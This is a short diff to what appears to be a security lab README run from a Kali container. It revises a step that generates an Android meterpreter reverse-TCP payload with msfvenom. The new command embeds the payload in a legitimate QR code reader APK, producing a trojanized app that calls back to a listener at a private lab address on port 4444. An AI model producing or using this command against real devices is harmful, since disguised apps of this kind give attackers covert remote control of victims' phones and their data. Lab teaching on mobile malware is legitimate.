@@ -26,5 +26,5 @@ docker exec -it kali bash
 
 1. Create .apk reverce tcp payload with msfvenom command and set LHOST and LPORT. Then save .apk file:
 ```bash
-msfvenom -p android/meterpreter/reverse_tcp LHOST=172.16.238.10 LPORT=4444 R > maliciousapp.apk
+ msfvenom -p android/meterpreter/reverse_tcp -x app/QRcodeReader.apk LHOST=172.16.238.10 LPORT=4444 -f raw -o malware.apk
 ```
